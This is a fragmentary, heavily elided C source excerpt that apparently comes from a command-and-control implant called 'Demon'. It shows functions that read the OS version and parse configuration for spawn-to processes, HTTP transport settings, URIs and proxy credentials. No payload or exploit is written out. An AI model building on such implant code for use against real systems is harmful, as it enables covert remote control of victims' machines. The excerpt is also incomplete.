...
VOID DemonMetaData( PPACKAGE* MetaData, BOOL Header )
{
    ...
    */
    ...
    Instance->Win32.RtlGetVersion( (RTL_OSVERSIONINFOW *)&OsVersions );
...
VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
{
    ...
    if ( NT_SUCCESS( Instance->Win32.RtlGetVersion( (RTL_OSVERSIONINFOW *)&OSVersionExW ) ) ) {
...
VOID DemonConfig()
{
    ...
    memcpy( Instance->Config.Process.Spawn64, Buffer, Length );

    Buffer = ParserGetBytes( &Parser, &Length );
    Instance->Config.Process.Spawn86 = Instance->Win32.LocalAlloc( LPTR, Length );
    memcpy( Instance->Config.Process.Spawn86, Buffer, Length );
    ...
    memcpy( Instance->Config.Transport.Method, Buffer, Length );
    ...
    memcpy( Instance->Config.Transport.UserAgent, Buffer, Length );
    ...
    for ( INT i = 0; i < J; i++ )
    {
        ...
        memcpy( Instance->Config.Transport.Headers[ i ], Buffer, Length );
#ifdef DEBUG
    ...
    for ( INT i = 0; i < J; i++ )
    {
        ...
        memcpy( Instance->Config.Transport.Uris[ i ], Buffer, Length );
#ifdef DEBUG
    ...
    if ( Instance->Config.Transport.Proxy.Enabled )
    {
        ...
        memcpy( Instance->Config.Transport.Proxy.Url, Buffer, Length );
        ...
        if ( Length > 0 )
        {
            ...
            memcpy( Instance->Config.Transport.Proxy.Username, Buffer, Length );
        ...
        if ( Length > 0 )
        {
            ...
            memcpy( Instance->Config.Transport.Proxy.Password, Buffer, Length );
    ...
    memcpy( Instance->Config.Transport.Name, Buffer, Length );
